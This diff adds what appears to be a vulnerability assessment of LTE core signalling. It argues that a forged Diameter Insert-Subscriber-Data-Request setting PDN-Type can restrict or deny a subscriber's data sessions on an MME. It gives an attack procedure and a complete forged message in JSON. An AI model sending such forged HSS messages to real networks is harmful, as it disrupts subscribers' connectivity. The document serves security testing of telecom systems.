@@ -1,0 +1,170 @@
+**Threat Model:**
+
+- **Attack Assumption:**  
+  A publicly reachable **MME** exposes **S6a** and accepts attacker-originated Diameter connections without peer authentication. The attacker impersonates the **HSS** role and sends a forged **Insert-Subscriber-Data-Request (IDR)** for a known subscriber IMSI. The MME processes the request and updates its stored subscriber data.
+
+- **Attacker Capability:**  
+  The attacker can only send crafted Diameter requests to the victim MME on the attacker-controlled connection and receive the corresponding answers. The attacker cannot observe or alter legitimate HSS<->MME traffic and has no radio, SGW/PGW, or bearer-plane position. The analysis therefore turns on whether changing `Subscription-Data.APN-Configuration-Profile.APN-Configuration.PDN-Type` in the forged IDR causes a distinct effect beyond the generic fact that an IDR was accepted.
+
+**Exploitability Analysis:**
+
+`Subscription-Data.APN-Configuration-Profile.APN-Configuration.PDN-Type` is exploitable under this threat model because it is authoritative **per-APN subscriber provisioning state** that the MME stores and later enforces.
+
+The message direction is **HSS -> MME** on S6a, and the target field sits inside one `APN-Configuration` entry within the subscriber's `APN-Configuration-Profile`. That entry is keyed by its own `Context-Identifier`, while the profile-level `Context-Identifier` identifies the default APN configuration. `PDN-Type` is a mandatory enumerated AVP in `APN-Configuration`, with values such as `IPv4`, `IPv6`, `IPv4v6`, and `IPv4_OR_IPv6`.
+
+The protocol evidence shows that on receipt of IDR, the MME does not treat this field as informational. It **replaces or adds stored subscription data** from the request. For `APN-Configuration-Profile`, the MME either:
+- deletes all stored APN configurations and installs the supplied set, if `All-APN-Configurations-Included-Indicator` says all are included; or
+- replaces/adds individual `APN-Configuration` entries matched by `Context-Identifier`.
+
+Therefore the forged `PDN-Type` becomes stored **subscriber/APN state** in the MME. Its scope is per subscriber, per APN entry, and if the targeted entry is also the default APN entry, it affects default attach data session behavior as well.
+
+The field-specific impact is concrete and standards-backed. Later, during **Attach** or **UE requested PDN connectivity**, the MME compares the UE-requested PDN type with the **subscribed PDN type for that APN**. That comparison can cause the MME to:
+- accept and use the requested type;
+- override it to the subscribed single-stack type;
+- or reject the PDN connection when the requested and subscribed types are incompatible.
+
+This is a distinct effect attributable to `PDN-Type` itself. For example, if a subscriber's default APN normally allows `IPv4v6` and the attacker overwrites it to `IPv4`, later dual-stack requests can be forced to single-stack or rejected according to the standards-defined logic. The altered value also propagates into downstream session establishment, because the MME includes the resulting **PDN Type** in **GTPv2-C Create Session Request** toward the SGW/PGW.
+
+This goes beyond generic forged-IDR harm. A forged IDR can broadly alter subscriber data, but this specific field independently changes **APN-specific PDN authorization and session type selection**. The security-relevant consequences include:
+- denial of connectivity for that APN due to PDN-type mismatch;
+- forced wrong IP-family selection;
+- altered default attach PDN session behavior when the modified APN is the default entry;
+- stale subscriber-impacting misconfiguration until legitimate overwrite or context recreation.
+
+Recovery is not immediate. The bad state persists in MME subscriber context until a later legitimate HSS update, a full subscription refresh, or context loss and re-download. That persistence strengthens the exploitability finding.
+
+**Attack Procedure:**
+
+Craft a forged **Insert-Subscriber-Data-Request** from the attacker-controlled HSS-impersonating Diameter connection to the target MME. Include only mandatory and coherence-related AVPs needed to carry a plausible `Subscription-Data` update for one APN configuration, and exclude unrelated subscriber data.
+
+To make the effect deterministic and field-specific:
+- target a known subscriber via `User-Name`;
+- send `APN-Configuration-Profile` with `All-APN-Configurations-Included-Indicator` set to include all APNs, so the MME replaces stored APN configuration state with the supplied set;
+- point the profile-level `Context-Identifier` to the included APN entry so the entry is the **default APN configuration**;
+- set `APN-Configuration.Context-Identifier` coherently;
+- set `Service-Selection` to the target APN string;
+- include required `EPS-Subscribed-QoS-Profile` and `AMBR`;
+- set the target field `PDN-Type` to a malicious test value such as `IPv6` to force a single-stack restriction.
+
+The malicious test value here is `PDN-Type = IPv6`, chosen to create an observable effect when the subscriber or test UE later attempts default attach or PDN connectivity expecting dual-stack or IPv4 service.
+
+Expected success condition: the MME accepts the IDR, stores the altered APN configuration, and later enforces the modified PDN-type subscription for that APN, causing changed session establishment behavior or rejection.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 319,
+    "application_id": 16777251,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "hss.example.net;1710000000;123456"
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "mme01.epc.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "epc.example.net"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "001010123456789"
+    },
+    {
+      "avp_name": "Subscription-Data",
+      "grouped_avp": [
+        {
+          "avp_name": "APN-Configuration-Profile",
+          "grouped_avp": [
+            {
+              "avp_name": "Context-Identifier",
+              "avp_value": 1
+            },
+            {
+              "avp_name": "All-APN-Configurations-Included-Indicator",
+              "avp_value": 0
+            },
+            {
+              "avp_name": "APN-Configuration",
+              "grouped_avp": [
+                {
+                  "avp_name": "Context-Identifier",
+                  "avp_value": 1
+                },
+                {
+                  "avp_name": "PDN-Type",
+                  "avp_value": "IPv6"
+                },
+                {
+                  "avp_name": "Service-Selection",
+                  "avp_value": "internet"
+                },
+                {
+                  "avp_name": "EPS-Subscribed-QoS-Profile",
+                  "grouped_avp": [
+                    {
+                      "avp_name": "QoS-Class-Identifier",
+                      "avp_value": 9
+                    },
+                    {
+                      "avp_name": "Allocation-Retention-Priority",
+                      "grouped_avp": [
+                        {
+                          "avp_name": "Priority-Level",
+                          "avp_value": 15
+                        },
+                        {
+                          "avp_name": "Pre-emption-Capability",
+                          "avp_value": 1
+                        },
+                        {
+                          "avp_name": "Pre-emption-Vulnerability",
+                          "avp_value": 0
+                        }
+                      ]
+                    }
+                  ]
+                },
+                {
+                  "avp_name": "AMBR",
+                  "grouped_avp": [
+                    {
+                      "avp_name": "Max-Requested-Bandwidth-UL",
+                      "avp_value": 50000
+                    },
+                    {
+                      "avp_name": "Max-Requested-Bandwidth-DL",
+                      "avp_value": 100000
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
